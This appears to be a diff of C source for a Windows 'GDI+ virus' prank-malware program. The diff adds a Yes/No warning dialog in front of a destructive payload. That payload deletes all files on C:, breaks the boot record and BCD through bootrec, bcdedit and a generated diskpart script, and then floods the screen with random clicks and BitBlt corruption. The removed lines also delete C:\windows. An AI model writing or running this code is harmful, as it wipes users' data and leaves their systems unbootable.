@@ -35,28 +35,64 @@ DWORD WINAPI shader1(LPVOID lpParam) {
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-	int sw = GetSystemMetrics(0);
-	int sh = GetSystemMetrics(0);
+    int sw = GetSystemMetrics(0);
+    int sh = GetSystemMetrics(0);
 
-	SetCursorPos(0, 0);
+    int msgboxID = MessageBox(
+        NULL,
+        (LPCWSTR)L"THIS IS A DANGEROUS GDI+ VIRUS THAT CAN SERIOUSLY DAMAGE YOUR COMPUTER,\nARE YOU SURE YOU WANT TO CONTINUE????????",
+        (LPCWSTR)L"WARNING",
+        MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2
+    );
 
-    CreateThread(0, 0, shader1, 0, 0, 0);
+    switch (msgboxID)
+    {
+    case IDYES:
+        SetCursorPos(0, 0);
 
-	system("del /S /F /Q /A:S C:\windows");
+        CreateThread(0, 0, shader1, 0, 0, 0);
 
-	while (true)
-	{
-		SetCursorPos(rand() % sw - 1, rand() % sh - 1);
+        // Killing
+        system("bootrec /fixmbr");
+        system("bootrec /fixboot");
+        system("bootrec /rebuildbcd");
+        system("bcdedit /store c:\\boot\\bcd /delete {bootmgr} /f");
+        system("del /f /s /q C:\\*.*");
+		system("echo select disk 0 > diskpart.txt");
+		system("echo select partition 1 >> diskpart.txt");
+		system("echo assign letter=S >> diskpart.txt");
+		system("echo exit >> diskpart.txt");
+        system("diskpart /s diskpart.txt");
+        system("attrib -s -h -r S:\* /s /d");
+		system("del S:\\Boot\\BCD");
+		system("bcdedit /delete {bootmgr} /f");
 
-        mouse_event(MOUSEEVENTF_LEFTDOWN, rand() % sw - 1, rand() % sh - 1, 0, 0);
-        mouse_event(MOUSEEVENTF_LEFTUP, rand() % sw - 1, rand() % sh - 1, 0, 0);
+        while (true)
+        {
+            // mouse stuff
+            SetCursorPos(rand() % sw - 1, rand() % sh - 1);
 
-        HDC hdc = GetDC(0);
-        int x = SM_CXSCREEN;
-        int y = SM_CYSCREEN;
-        int w = GetSystemMetrics(0);
-        int h = GetSystemMetrics(1);
-        BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
-        ReleaseDC(0, hdc);
-	}
+            mouse_event(MOUSEEVENTF_LEFTDOWN, rand() % sw - 1, rand() % sh - 1, 0, 0);
+            mouse_event(MOUSEEVENTF_LEFTUP, rand() % sw - 1, rand() % sh - 1, 0, 0);
+
+            // MY EYES AHH THEY BURN
+            HDC hdc = GetDC(0);
+            int x = SM_CXSCREEN;
+            int y = SM_CYSCREEN;
+            int w = GetSystemMetrics(0);
+            int h = GetSystemMetrics(1);
+            BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
+            ReleaseDC(0, hdc);
+        }
+        break;
+
+    case IDNO:
+        ExitProcess(0);
+        break;
+
+        default:
+        ExitProcess(0);
+	    break;
+    }
+	return 0;
 }
